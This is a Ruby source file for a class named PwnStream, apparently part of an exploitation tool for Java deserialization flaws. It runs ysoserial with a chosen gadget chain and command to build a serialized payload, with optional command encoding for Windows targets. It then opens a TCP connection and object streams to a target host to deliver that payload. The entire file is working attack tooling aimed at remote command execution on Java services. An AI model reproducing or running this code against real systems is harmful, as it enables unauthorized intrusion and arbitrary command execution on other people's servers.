require 'socket'
require 'open3'
require_relative 'ObjectInputStream'
require_relative 'ObjectOutputStream'
require_relative 'Utils'

module ObjectPwnStream
  class PwnStream
      @host = nil
      @port = nil
      @socket = nil
      @payload = nil

      include ObjectOutputStream
      include ObjectInputStream
      attr_reader :socket
      def initialize(host, port, connect=false)
        @host = host
        @port = port.to_i
        connect! if connect
      end

      def connect!
        @socket ||= TCPSocket.open(@host, @port)
      end

      def close!
        @socket.flush
        @socket.close
        @socket = nil
      end

      def ysoserial_generate!(ysoserial_path, gadget, cmd, java_path: nil, encode: false, windows: false)
        cmd = Utils.exec_encode(cmd, windows) if encode
        ycmd = "#{java_path && '"'}#{java_path || 'java'}#{java_path && '"'} -jar \"#{ysoserial_path}\" #{gadget} \"#{cmd}\""
        stdout = Open3.capture3(ycmd, :binmode => true)[0]
        if stdout.empty?
          raise Errors::YsoserialGenerateError.new(ycmd)
        else
          ObjectInputStream.check_stream_header(stdout[...4].unpack("S>*"), provided=false)
          @payload = stdout[4..]
        end
      end

      alias_method :open_input_stream!, :open_input_stream
      alias_method :open_output_stream!, :open_output_stream
      def open_streams!
        @socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
        open_input_stream
        open_output_stream
      end
  end
end